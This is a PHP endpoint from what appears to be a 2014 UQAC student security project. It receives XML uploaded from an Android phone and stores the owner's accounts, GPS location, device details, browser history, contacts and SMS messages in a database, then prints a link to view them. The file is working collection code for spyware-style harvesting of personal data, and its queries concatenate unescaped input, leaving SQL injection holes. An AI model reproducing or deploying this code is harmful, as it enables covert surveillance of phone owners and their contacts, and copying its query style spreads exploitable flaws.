<!DOCTYPE html>
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
        <title>Projet de sécurité - UQAC 2014</title>
    </head>
    <body>
<?php
		include("db_connect.php");
		
		if (isset($_POST["xml"])){
			$ALLXMLSTR = $_POST["xml"];
		
			$ALLXMLSTR = str_replace("&", "&amp;", $ALLXMLSTR);
			
			loadAllXML($ALLXMLSTR, $bdd);
			
			$ALLXML = new DOMDocument;
			$ALLXML->loadXML($ALLXMLSTR);
			if (!$ALLXML) {
				print 'Document XML non valide';
				exit;
			}
			
			$USERID = creerUtilisateur($ALLXML->getElementsByTagName('ALLACCOUNTS')->item(0), $bdd);
			
			if ($USERID>0){
				creerLocalisation($ALLXML->getElementsByTagName('localisation')->item(0), $USERID, $bdd);
				creerTelephone($ALLXML->getElementsByTagName('deviceInformations')->item(0), $USERID, $bdd);
				creerHistorique($ALLXML->getElementsByTagName('ALLHISTORY')->item(0), $USERID, $bdd);
				creerContacts($ALLXML->getElementsByTagName('ALLCONTACTS')->item(0), $USERID, $bdd);
				creerSMS($ALLXML->getElementsByTagName('ALLSMS')->item(0), $USERID, $bdd);
			}
			else
				print "Utilisateur non créé";
		}
		else
			print "Aucune information envoyée";
		
		
		
		/*******************************************************************************************************
		*
		*   LOAD ALL XML
		*
		*******************************************************************************************************/
		function loadAllXML($XMLSTR, $bdd){
			$sql = $bdd->exec("insert into BIDON(value) values ('$XMLSTR')");
		}
		
		
		
		
		/*******************************************************************************************************
		*
		*   CREATION SMS
		*
		*******************************************************************************************************/
		function creerSMS($XML, $USERID, $bdd){
			// get contact from phone number
			$requeteContactStr = "select ID from CONTACT where NUMEROTEL1 = :contactNumber1 or NUMEROTEL2 = :contactNumber2";
			$requeteContact = $bdd->prepare($requeteContactStr);
			
			//get BDD ID of table CONVERSATION from thread_id
			$requeteConversationStr = "select ID from CONVERSATION where THREADID = :convID and ID_UTILISATEUR = :userID";
			$requeteConversation = $bdd->prepare($requeteConversationStr);
			
			foreach($XML->getElementsByTagName('sms') as $sms){
				$id_conv = null;
				$contactNumber = str_replace("+33", "0", addslashes($sms->getElementsByTagName('contactNumber')->item(0)->nodeValue));
				$convID = addslashes($sms->getElementsByTagName('convID')->item(0)->nodeValue);
				$message = addslashes($sms->getElementsByTagName('message')->item(0)->nodeValue);
				$date = addslashes($sms->getElementsByTagName('date')->item(0)->nodeValue);
				$statusSMS = intval(addslashes($sms->getElementsByTagName('status')->item(0)->nodeValue)) + 1;
				
				$requeteConversation->execute(array(':convID' => $convID, ':userID' => $USERID));
				$result = $requeteConversation->fetch(PDO::FETCH_OBJ);
				if ($result)
					$id_conv = $result->ID;
				
				if (!$id_conv){
					$id_contact = "null";
					$requeteContact->execute(array(':contactNumber1' => $contactNumber, ':contactNumber2' => $contactNumber));
					$result = $requeteContact->fetch(PDO::FETCH_OBJ);
					if ($result)
						$id_contact = $result->ID;
					
					$requete = "insert into CONVERSATION(ID_CONTACT, ID_UTILISATEUR, THREADID) values ($id_contact, $USERID, $convID)";
					$sql = $bdd->exec($requete);
					if ($sql>0)
						$id_conv = $bdd->lastInsertId(); 
				}
				
				if ($id_conv>=0){
					$requete = "insert into SMS(ID_CONVERSATION, BODYSMS, DATEENVOI, ENVOYEPARUTILISATEUR) values ($id_conv, '$message', FROM_UNIXTIME($date), $statusSMS)";
					$sql = $bdd->exec($requete);
				}
			}
		}
		
		
		
		
		
		
		/*******************************************************************************************************
		*
		*   CREATION CONTACTS
		*
		*******************************************************************************************************/
		function creerContacts($XML, $USERID, $bdd){
			foreach($XML->getElementsByTagName('contact') as $contact){
				$id = $contact->getElementsByTagName('id')->item(0)->nodeValue;
				$name = addslashes($contact->getElementsByTagName('DisplayName')->item(0)->nodeValue);
				$adresse = ""; //XML!!!!!
				
				if ($contact->getElementsByTagName('email')->length>0)
					$email1 = addslashes($contact->getElementsByTagName('email')->item(0)->nodeValue);
				else $email1 = "";
				
				if ($contact->getElementsByTagName('email')->length>1)
					$email2 = addslashes($contact->getElementsByTagName('email')->item(1)->nodeValue);
				else $email2 = "";
				
				$timeContact = 0;
				$phone1 = "";
				$phone2 = "";
				
				if ($contact->getElementsByTagName('phone')->length>0){
					$phone1 = str_replace("+33", "0", addslashes($contact->getElementsByTagName('phone')->item(0)->getElementsByTagName('number')->item(0)->nodeValue));
					$timeContact += $contact->getElementsByTagName('phone')->item(0)->getElementsByTagName('timeContact')->item(0)->nodeValue;
				}
				
				if ($contact->getElementsByTagName('phone')->length>1){
					$phone2 = str_replace("+33", "0", addslashes($contact->getElementsByTagName('phone')->item(1)->getElementsByTagName('number')->item(0)->nodeValue));
					$timeContact += $contact->getElementsByTagName('phone')->item(1)->getElementsByTagName('timeContact')->item(0)->nodeValue;
				}
				
				if ($contact->getElementsByTagName('organization')->length>0){
					$organizationName = addslashes($contact->getElementsByTagName('organization')->item(0)->getElementsByTagName('organizationName')->item(0)->nodeValue);
					$title = addslashes($contact->getElementsByTagName('organization')->item(0)->getElementsByTagName('title')->item(0)->nodeValue);
				}
				else{
					$organizationName = "";
					$title = "";
				}
				
				
				$requete = "insert into CONTACT(ID_UTILISATEUR, IDCONTACTANDROID, NOM, NUMEROTEL1, NUMEROTEL2, EMAIL1, EMAIL2, ADRESSE, NOMORGANISATION, TITREORGANISATION, NBCONTACTSTEL, NBCONTACTSSMS)".
									  " values ($USERID, $id, '$name', '$phone1','$phone2', '$email1', '$email2', '$adresse', '$organizationName', '$title', $timeContact, NULL)";
				$sql = $bdd->exec($requete);
			}
		}
		
		
		
		
		/*******************************************************************************************************
		*
		*   CREATION HISTORIQUE
		*
		*******************************************************************************************************/
		function creerHistorique($XML, $USERID, $bdd){
			foreach($XML->getElementsByTagName('browserPage') as $historic){
				$titre = addslashes($historic->getElementsByTagName('title')->item(0)->nodeValue);
				$url = addslashes($historic->getElementsByTagName('url')->item(0)->nodeValue);
				
				$requete = "insert into HISTORIQUE(ID_UTILISATEUR, TITRE, URL) values ($USERID, '$titre', '$url')";
				$sql = $bdd->exec($requete);
			}
		}
		
		
		/*******************************************************************************************************
		*
		*   CREATION TELEPHONE
		*
		*******************************************************************************************************/
		function creerTelephone($XML, $USERID, $bdd){
			$numtel = ""; // XML!!!!!!!!!
			$imei = ""; // XML!!!!!!!!!
			$model = addslashes($XML->getElementsByTagName('model')->item(0)->nodeValue);
			$hardware = addslashes($XML->getElementsByTagName('hardware')->item(0)->nodeValue);
			$manufacturer = addslashes($XML->getElementsByTagName('manufacturer')->item(0)->nodeValue);
			$product = addslashes($XML->getElementsByTagName('product')->item(0)->nodeValue);
			$user = addslashes($XML->getElementsByTagName('user')->item(0)->nodeValue);
			
			$requete = "insert into TELEPHONE(ID_UTILISATEUR, NUMEROTEL, MODELE, VERSION, IMEI) values ($USERID, '$numtel', '$product $model', '$user $manufacturer $hardware', '$imei')";
			$sql = $bdd->exec($requete);
			
			return $sql;
		}
		
		
		/*******************************************************************************************************
		*
		*   CREATION LOCALISATION
		*
		*******************************************************************************************************/
		function creerLocalisation($XML, $USERID, $bdd){
			$lat = addslashes($XML->getElementsByTagName('lat')->item(0)->nodeValue);
			$lon = addslashes($XML->getElementsByTagName('lon')->item(0)->nodeValue);
			
			$requete = "insert into LOCALISATION(ID_UTILISATEUR, COORDONNEES) values ($USERID, '$lat,$lon')";
			$sql = $bdd->exec($requete);
			
			return $sql;
		}
		
		
		/*******************************************************************************************************
		*
		*   CREATION UTILISATEUR
		*
		*******************************************************************************************************/
		function creerUtilisateur($XML, $bdd){
			$nom1 = addslashes($XML->getElementsByTagName('OwnerAccount')->item(0)->getElementsByTagName('name')->item(0)->nodeValue);
			$adresse1 = "";
			$gmail1 = addslashes($XML->getElementsByTagName('OwnerAccount')->item(0)->getElementsByTagName('email')->item(0)->nodeValue);
			
			if ($XML->getElementsByTagName('OwnerAccount')->length>1){
				$nom2 = addslashes($XML->getElementsByTagName('OwnerAccount')->item(1)->getElementsByTagName('name')->item(0)->nodeValue);
				$adresse2 = "";
				$gmail2 = addslashes($XML->getElementsByTagName('OwnerAccount')->item(1)->getElementsByTagName('email')->item(0)->nodeValue);
			}
			else{
				$nom2 = "";
				$adresse2 = "";
				$gmail2 = "";
			}
			
			$randomString = substr(str_shuffle("0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"), 0, 32);
			
			$requete = "insert into UTILISATEUR(NOM1, NOM2, ADRESSE1, ADRESSE2, COMPTEMAIL1, COMPTEMAIL2, DATEENREGISTREMENTBDD, CHAINEUNIQUE) values ('$nom1', '$nom2', '$adresse1', '$adresse2', '$gmail1', '$gmail2', now(), '$randomString')";
			$sql = $bdd->exec($requete);
			
			if ($sql>0){
				print "#####http://uqac.netii.net/show.php?uid=$randomString#####";
				return $bdd->lastInsertId(); 
			}
			return -1;
		}
?>
	</body>
</html>